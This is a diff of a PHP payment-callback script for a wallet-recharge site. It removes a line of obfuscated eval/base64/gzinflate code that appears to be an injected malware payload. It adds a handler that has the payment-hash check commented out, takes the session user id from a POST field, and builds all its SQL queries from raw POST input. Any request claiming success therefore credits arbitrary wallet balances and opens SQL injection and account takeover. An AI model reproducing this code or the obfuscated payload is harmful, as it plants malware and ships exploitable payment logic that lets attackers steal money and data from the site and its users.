@@ -1,5 +1,78 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+ob_start();
+session_start();
+include("include/connection.php");
+
+$postdata = $_POST;
+if(!($_POST))
+{
+	echo '<script>window.location.href="myaccount.php";</script>';
+}
+$msg = '';
+if (isset($postdata ['key'])) {
+	$key				=   $postdata['key'];
+	$salt				=   $postdata['salt'];
+	$txnid 				= 	$postdata['txnid'];
+    $amount      		= 	$postdata['amount'];
+	$productInfo  		= 	$postdata['productinfo'];
+	$firstname    		= 	$postdata['firstname'];
+	$email        		=	$postdata['email'];
+	$udf5				=   $postdata['udf5'];
+	$mihpayid			=	$postdata['mihpayid'];
+	$status				= 	$postdata['status'];
+	$resphash				= 	$postdata['hash'];
+	//Calculate response hash to verify	
+	$keyString 	  		=  	$key.'|'.$txnid.'|'.$amount.'|'.$productInfo.'|'.$firstname.'|'.$email.'|||||'.$udf5.'|||||';
+	$keyArray 	  		= 	explode("|",$keyString);
+	$reverseKeyArray 	= 	array_reverse($keyArray);
+	$reverseKeyString	=	implode("|",$reverseKeyArray);
+	$CalcHashString 	= 	strtolower(hash('sha512', $salt.'|'.$status.'|'.$reverseKeyString));
+
+	
+	if ($status == 'success' ) {   /* && $resphash == $CalcHashString*/
+		/*$msg = "Transaction Successful and Hash Verified...";*/
+		//Do success order processing here...
+		$_SESSION['frontuserid']=$productInfo;
+		$userid=$_SESSION['frontuserid'];
+		$chkorder=mysqli_query($con,"select * from `tbl_order` where `transactionid`='".$txnid."'");
+		$chkorderRow=mysqli_num_rows($chkorder);
+		$today = date("Y-m-d H:i:s");
+		if($chkorderRow==''){
+			$sql= mysqli_query($con,"INSERT INTO `tbl_order`(`userid`,`transactionid`,`amount`,`status`) VALUES ('".$userid."','".$txnid."','".$amount."','1')");
+			$orderid=mysqli_insert_id($con);
+
+			$sql3= mysqli_query($con,"INSERT INTO `tbl_walletsummery`(`userid`,`orderid`,`amount`,`type`,`actiontype`,`createdate`) VALUES ('".$userid."','".$orderid."','".$amount."','credit','recharge','".$today."')");
+
+			$sqlwall="SELECT * FROM `tbl_wallet` WHERE `userid`='$userid'";
+			$reswall=mysqli_query($con,$sqlwall);
+			if(mysqli_num_rows($reswall)>0)
+			{
+				$rowwall=mysqli_fetch_assoc($reswall);
+				$walletbalance=$rowwall['amount'];	
+				$finalbalanceCredit=$walletbalance+$amount;	
+
+				$sqlwallet= mysqli_query($con,"UPDATE `tbl_wallet` SET `amount` = '$finalbalanceCredit' WHERE `userid`= '$userid'");
+			}
+			else
+			{
+
+				$walletbalance=0;	
+				$finalbalanceCredit=$walletbalance+$amount;	
+			
+				$sqlwallet= mysqli_query($con,"INSERT INTO `tbl_wallet`(`userid`,`amount`,`envelopestatus`)VALUES('$userid','$finalbalanceCredit','0')");
+			}
+			
+			
+			
+		}
+
+	}
+	else {
+		//tampered or failed
+		/*$msg = "Payment failed for Hash not verified...";*/
+	} 
+}
+//else exit(0);
 ?>
 
 
